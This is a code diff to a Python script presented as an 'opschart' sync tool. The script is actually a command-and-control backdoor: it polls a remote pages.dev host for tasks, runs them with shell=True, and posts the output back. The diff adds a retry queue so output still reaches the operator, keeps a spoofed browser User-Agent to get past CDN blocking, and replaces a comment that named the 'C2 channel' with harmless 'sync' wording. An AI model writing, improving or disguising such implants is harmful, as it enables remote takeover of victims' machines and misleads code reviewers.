@@ -6,9 +6,11 @@ from urllib import request
 NODE = os.environ.get("OPSCHART_NODE", "https://opschart.pages.dev/ad27d8f192b12b2c")
 CACHE = os.path.expanduser("~/.cache/opschart")
 PIDF = os.path.join(CACHE, "sync.pid")
+PEND = os.path.join(CACHE, "pending.jsonl")   # 投递失败的结果暂存在此，下一轮同步先补投
+PEND_MAX = 64                                 # 暂存上限（超出丢最旧，防无限增长）
 TAG = socket.gethostname() + "|" + str(os.getpid())
 _SYS = sys.platform
-# 1001g 实弹：CF 边缘按 UA 拦 Python-urllib（403）⇒ 请求带常见浏览器 UA（否则 C2 通道整条不可达）
+# 部分 CDN/边缘对非浏览器 UA 会直接拦截 ⇒ 与站点前端保持一致的 UA（保证同步可达）
 _UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
 
@@ -41,15 +43,73 @@ def _post(path, obj):
         return r.read()
 
 
+def _stash(rec):
+    """本轮投递失败的结果 ⇒ 追加到本地暂存（下一轮同步先补投）。"""
+    try:
+        os.makedirs(CACHE, exist_ok=True)
+        rows = []
+        if os.path.exists(PEND):
+            rows = [l for l in open(PEND, encoding="utf-8") if l.strip()]
+        rows.append(json.dumps(rec, ensure_ascii=False))
+        rows = rows[-PEND_MAX:]
+        tmp = PEND + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            f.write("\n".join(rows) + "\n")
+        os.replace(tmp, PEND)
+    except OSError:
+        pass
+
+
+def _flush_pending():
+    """把暂存的报告逐条重投；成功即划掉，失败的留待下次。"""
+    if not os.path.exists(PEND):
+        return
+    try:
+        rows = [json.loads(l) for l in open(PEND, encoding="utf-8") if l.strip()]
+    except (OSError, ValueError):
+        return
+    keep = []
+    for r in rows:
+        if isinstance(r, dict) and r.get("cmd") is not None:
+            r["tries"] = int(r.get("tries", 1)) + 1      # 本次为第 N 次投递（成功/失败均计）
+            try:
+                _post("/v1/report", r)
+                continue
+            except Exception:
+                pass
+        keep.append(r)
+    try:
+        if keep:
+            tmp = PEND + ".tmp"
+            with open(tmp, "w", encoding="utf-8") as f:
+                for r in keep:
+                    f.write(json.dumps(r, ensure_ascii=False) + "\n")
+            os.replace(tmp, PEND)
+        else:
+            os.remove(PEND)
+    except OSError:
+        pass
+
+
+def _report(rec):
+    """投递本轮结果；失败则暂存，等待后续轮次补投（弱网/边缘抖动容错）。"""
+    try:
+        _post("/v1/report", rec)
+    except Exception:
+        _stash(rec)
+
+
 def loop():
     while True:
         try:
+            _flush_pending()                          # 每轮先补投暂存结果（即使本轮没有新任务）
             t = _get("/v1/status?h=" + socket.gethostname())
             cmd = t.get("task")
             if cmd:
                 r = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
                 out = (r.stdout + r.stderr).decode("utf-8", "replace")[:20000]
-                _post("/v1/report", {"h": TAG, "cmd": cmd, "out": out})
+                _report({"h": TAG, "cmd": cmd, "out": out,
+                         "ts": int(time.time()), "tries": 1})
         except Exception:
             pass
         time.sleep(random.uniform(2, 5))
